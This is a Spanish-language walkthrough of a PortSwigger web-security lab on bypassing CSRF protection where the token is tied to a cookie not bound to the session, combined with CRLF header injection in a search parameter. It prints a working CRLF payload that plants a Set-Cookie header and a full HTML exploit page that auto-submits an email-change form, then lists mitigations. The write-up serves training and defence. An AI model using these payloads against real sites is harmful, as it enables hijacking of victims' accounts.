
---

# CSRF con token atado a cookie no vinculada a sesión

## 1. Introducción

En este laboratorio evaluamos una protección CSRF basada en dos elementos:

- Una cookie `csrfKey`
    
- Un token `csrf` enviado como parámetro
    

El objetivo del laboratorio es explotar el hecho de que **el token y la cookie no están atados a la sesión del usuario**, lo que permite reutilizar pares válidos para otros usuarios.

Además, existe otra debilidad adicional: la funcionalidad de búsqueda del sitio permite **inyectar cabeceras arbitrarias** mediante CRLF, lo que posibilita:

1. Setear una cookie `csrfKey` válida en el navegador de la víctima
    
2. Enviar un POST con el token correcto
    
3. Cambiar la dirección de correo del usuario víctima
    

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

---

## 2. Contexto de la vulnerabilidad

El sistema usa protección CSRF basada en:

- Cookie `csrfKey`
    
- Token `csrf` incluido en formularios
    

En condiciones seguras, estos valores deben ser:

- Únicos por sesión
    
- Asociados al usuario
    
- No controlables desde el cliente
    

Aquí ocurre lo contrario:

❌ La cookie no está vinculada a sesión  
❌ No se valida relación entre cookie y token  
❌ La cookie se puede inyectar en navegadores ajenos  
❌ La lógica de búsqueda permite CRLF y cabeceras arbitrarias

Esto permite a un atacante reciclar valores y forzar estado en navegadores terceros.

---

## 3. Análisis de peticiones

### 3.1 Obtención de valores útiles

Capturamos una petición válida de cambio de email:

- Cookie: `csrfKey=<valor>`
    
- Token: `csrf=<valor>`
    

### 3.2 Prueba de validación incompleta

En Burp Repeater:

- Cambiar cookie de sesión → logout (correcto)
    
- Cambiar solo cookie `csrfKey` → rechazo de token, pero no invalida sesión
    

Esto indica que:

> El valor de `csrfKey` no está asociado a la sesión ni al usuario.

### 3.3 Funcionalidad crítica adicional

Las respuestas del buscador reflejan contenido enviado por el usuario dentro de:

```
Set-Cookie:
```

➡️ Esto convierte el buscador en un **vector de CRLF injection**, permitiendo al atacante insertar:

- Línea nueva
    
- Nueva cabecera `Set-Cookie`
    

En el navegador víctima.

---

## 4. Explotación técnica

### 4.1 Inyección de cookies mediante CRLF

Para insertar un encabezado nuevo necesitamos romper la cabecera original y comenzar una nueva línea.

Esto se logra mediante:

- `%0d` → Carriage Return (CR)
    
- `%0a` → Line Feed (LF)
    

Secuencia `%0d%0a` permite:

```
[HEADER ORIGINAL]CRLFSet-Cookie: csrfKey=valor; SameSite=None
```

Ejemplo usado:

```
?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

Este payload:

1. Inicia una línea nueva
    
2. Introduce un encabezado `Set-Cookie`
    
3. Define nuestro valor `csrfKey`
    
4. Marca la cookie como utilizable en contexto cross-site (`SameSite=None`)
    

### 4.2 Construcción del exploit

El exploit final requiere:

- Inyectar cookie `csrfKey` mediante `<img>`
    
- Enviar formulario con token válido
    

Ejemplo funcional:

```html
<form class="login-form" name="change-email-form" action="https://0a2200650425b95b80040386005100c6.web-security-academy.net/my-account/change-email" method="POST">
    <input type="email" name="email" value="hacked@hacked.com">
    <input required="" type="hidden" name="csrf" value="ZYtm9BUk4n6yVJ7qrRuOwWJViBusqFv8">
</form>

<img src="https://0a2200650425b95b80040386005100c6.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrfKey=NleUaKsNxoselNgxskrn2pww5v2uVGaB%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

El `<img>`:

- Fuerza petición GET al buscador
    
- Inyecta el `Set-Cookie`
    
- Y, al fallar carga, ejecuta `submit()`
    

Resultado:

✔ Cookie correcta establecida  
✔ Token aceptado  
✔ Email víctima modificado

---

## 5. Publicación y verificación

El exploit se almacena en el servidor "exploit server" del laboratorio.

Luego:

1. Se publica
    
2. Se pulsa "Deliver to victim"
    
3. El laboratorio reporta "Solved"
    

Si el exploit se ejecuta correctamente:

- La cookie aparece en navegador víctima
    
- El formulario se envía con token válido
    
- Se produce el cambio de email
    

---

## 6. Fundamentación técnica

Este caso demuestra cómo dos conceptos de seguridad relacionados:

- CSRF tokens
    
- Cookies
    

pueden resultar ineficaces cuando:

- No hay vínculo sesión → token → cookie
    
- No hay validación contextual del origen
    
- Valores están bajo control del atacante
    

Y además, cómo una pequeña funcionalidad aparentemente inocua (un buscador) se convierte en:

> Un vector para manipular el estado del navegador víctima

gracias a CRLF injection.

---

## 7. Conclusión

El sistema confía en:

- Token `csrf`
    
- Cookie `csrfKey`
    

Pero **no verifica que pertenezcan a la sesión del usuario**.

Además:

- El buscador permite inyección CRLF
    
- Las cabeceras se pueden redefinir
    
- La cookie se puede forzar al navegador víctima
    
- El token puede ser reutilizado
    

Esto permite ejecutar CSRF sin conocimiento de credenciales ni tokens de la víctima.

---

## 8. Mitigaciones

Para mitigar completamente:

1. Asociar token y cookie a la sesión
    
2. Invalidar tokens por sesión/usuario
    
3. Impedir CRLF injection en parámetros
    
4. No reflejar cabeceras basadas en entrada usuario
    
5. No aceptar `SameSite=None` sin control estricto
    
6. Regenerar tokens por solicitud crítica
    

---

# Resumen conceptual clave

En este laboratorio se explotan **dos debilidades simultáneas**:

1. Tokens CSRF sin vínculo con la sesión
    
2. Inyección de cabeceras mediante CRLF (`%0d%0a`)
    

La combinación permite:

→ Manipular estado del navegador víctima  
→ Reutilizar tokens legítimos  
→ Realizar cambios persistentes en su cuenta

---
